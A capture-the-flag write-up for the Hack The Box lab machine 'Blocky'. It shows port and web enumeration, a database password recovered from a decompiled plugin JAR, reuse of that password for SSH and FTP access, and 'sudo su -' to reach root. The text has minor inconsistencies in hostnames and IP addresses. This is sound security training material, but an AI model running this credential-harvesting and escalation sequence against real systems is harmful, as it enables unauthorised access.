## Default Information
IP Address: 10.10.10.37\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.37    blocky.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.146 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-02 01:05:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 21/tcp on 10.10.10.37
Discovered open port 22/tcp on 10.10.10.37
Discovered open port 80/tcp on 10.10.10.37
Discovered open port 25565/tcp on 10.10.10.37
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. Looking at the output, there are a number 
of services running on this machine, namely FTP,SSH,HTTO and a Minecraft server(???)

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 21	| FTP | ProFTPD 1.3.5a | Open |
| 22	| SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.18 ((Ubuntu)) | Open |
| 25565	| Minecraft | Minecraft 1.11.2 | Open |

Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of the ports. From the output, there are a number of findings:
* A username ```notch``` has been discovered on one of its wordpress sites
* Detection of a phpmyadmin endpoiint
* Detection of a wordpress endpoint

```
80/tcp   open   http    syn-ack ttl 63
| http-enum: 
|   /wiki/: Wiki
|   /wp-login.php: Possible admin folder
|   /phpmyadmin/: phpMyAdmin
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.8
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
| http-wordpress-users: 
| Username found: notch
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
```

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://blocky.htb. The endpoints that are discovered are mainly directories and furthur enumeration is 
required. However, one notable observation is that a number of these endpoints hint towards the usage of wordpress.

```
http://blocky.htb/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
http://blocky.htb/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
http://blocky.htb/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
http://blocky.htb/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
http://blocky.htb/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
http://blocky.htb/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
http://blocky.htb/server-status        (Status: 403) [Size: 298]
```
We will also tried to find virtual hosts on http://sense.htb, but we were unable to find any vhosts.

Next, we will try to use Gobuster to do an enumeration for common files extensions such as .js,.txt,.php and .html.

```
http://blocky.htb/index.php            (Status: 301) [Size: 0] [--> http://blocky.htb/]
http://blocky.htb/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
http://blocky.htb/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
http://blocky.htb/wp-login.php         (Status: 200) [Size: 2402]
http://blocky.htb/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
http://blocky.htb/license.txt          (Status: 200) [Size: 19935]
http://blocky.htb/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
http://blocky.htb/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
http://blocky.htb/readme.html          (Status: 200) [Size: 7413]
http://blocky.htb/wp-trackback.php     (Status: 200) [Size: 135]
http://blocky.htb/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
http://blocky.htb/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
http://blocky.htb/xmlrpc.php           (Status: 405) [Size: 42]
http://blocky.htb/wp-signup.php        (Status: 302) [Size: 0] [--> http://10.10.10.37/wp-login.php?action=register]
http://blocky.htb/server-status        (Status: 403) [Size: 298]
```

### Ferox Buster
We will also use Ferox Buster to check if we are able to find any new endpoints, that was previously not discovered by Gobuster.

### Web-content discovery

Navigating to http://blocky.htb/plugins, we realize that there are 2 jar files that we can download and analyze. 

![Plugins jar file download](https://github.com/joelczk/writeups/blob/main/HTB/Images/Blocky/plugins_jar.PNG)

Next,we will download the jar files and decompile the 2 files to look for any potential passwords that may be hardcoded.

_blockycore.jar_
```java
package com.myfirstplugin;

public class BlockyCore {
   public String sqlHost = "localhost";
   public String sqlUser = "root";
   public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";

   public void onServerStart() {
   }

   public void onServerStop() {
   }

   public void onPlayerJoin() {
      this.sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
   }

   public void sendMessage(String username, String message) {
   }
}
```

_griefprevention-1.11.2-3.1.1.298.jar_

```java
@ConfigSerializable
public class DatabaseCategory extends ConfigCategory {
   @Setting(
      value = "password",
      comment = "password"
   )
   public String dbPassword = "";
   @Setting(
      value = "username",
      comment = "username"
   )
   public String dbUsername = "";
   @Setting(
      value = "url",
      comment = "url"
   )
   public String dbURL = "";
}
```

However, upon furthur analysis of the decompiled source code for _griefprevention-1.11.2-3.1.1.298.jar_, we realize that this might be an open-sourced plugin used by Minecraft for grief prevention

```
[
    {
        "modid": "griefprevention",
        "name": "GriefPrevention",
        "version": "3.1.1",
        "description": "This plugin is designed to prevent all forms of grief.",
        "url": "https://github.com/MinecraftPortCentral/GriefPrevention",
        "dependencies": [
            "spongeapi@6.0.0-SNAPSHOT-6ff094e"
        ],
        "requiredMods": [
            "spongeapi@6.0.0-SNAPSHOT-6ff094e"
        ]
    }
]
```
## Exploit

Let's try to login to wordpress, phpmyadmin, SSH and FTP using the credentials that we have obtained. 
| Service | Username | Password |
|-----|------------------|----------------------|
| phpmyadmin	| root | 8YsqfCTnvxAUeduzjNSXe22 | 
| SSH	| notch | 8YsqfCTnvxAUeduzjNSXe22 |
| FTP	| notch | 8YsqfCTnvxAUeduzjNSXe22 |

_SSH Login_
```
┌──(kali㉿kali)-[~/Desktop]                                                                            
└─$ ssh notch@10.10.10.37                                                                              
The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.                             
ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.                          
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                              
Warning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts.                           
notch@10.10.10.37's password:                                                                          
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)                                     
                                                                                                       
 * Documentation:  https://help.ubuntu.com                                                             
 * Management:     https://landscape.canonical.com                                                    
 * Support:        https://ubuntu.com/advantage                                                       
                                                                                                       
7 packages can be updated.                                                                           
Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230                                             
notch@Blocky:~$ 
```

_FTP login_

```
┌──(kali㉿kali)-[~/Desktop]                                                                         
└─$ ftp                                                                                          
ftp> open                                                                                              
(to) 10.10.10.37                                                                                       
Connected to 10.10.10.37.                                                                              
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]                                                
Name (10.10.10.37:kali): notch                                                                         
331 Password required for notch                                                                        
Password:                                                                                              
230 User notch logged in                                                                               
Remote system type is UNIX.                                                                            
Using binary mode to transfer files.                                                                   
ftp>  
```

### Obtaining user flag

```
h@Blocky:~$ cat /home/notch/user.txt                                                              
<Redacted user flag>
notch@Blocky:~$  
```

### Privilege escalation to root

Executing ```sudo -l``` command requires us to put in the password. However, since we already know the password for notch, we are able to execute the command. From the output, we know that notch can execute all the commands as a sudo user. This makes it much easier for us to escalate our privileges to a root user.

```
notch@Blocky:~$ sudo -l                                                                                
[sudo] password for notch:                                                                             
Matching Defaults entries for notch on Blocky:                                                         
    env_reset, mail_badpass,                                                                          
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin           
User notch may run the following commands on Blocky:                                                   
    (ALL : ALL) ALL                                                                                    
notch@Blocky:~$ sudo su -                                                                              
root@Blocky:~# whoami                                                                                  
root                                                                                                   
root@Blocky:~#   
```
### Obtaining root flag

```
root@Blocky:~# cat root.txt                                                                           
<Redacted root flag>
root@Blocky:~# 
```

## Post-exploit
Lets first analyze this endpoint http://block.htb/xmlrpc.php that we found during our enumeration. This endpoint provides a list of functionality that we could potentially exploit.

![xmlrpc.php endpoint](https://github.com/joelczk/writeups/blob/main/HTB/Images/Blocky/xmlrpc.PNG)

This could be used to do user enumeration for wordpress endpoint as we can supply a dictionary list of username and password and check if the username-password matches

![Username-password enumeration](https://github.com/joelczk/writeups/blob/main/HTB/Images/Blocky/user_enumeration.PNG)
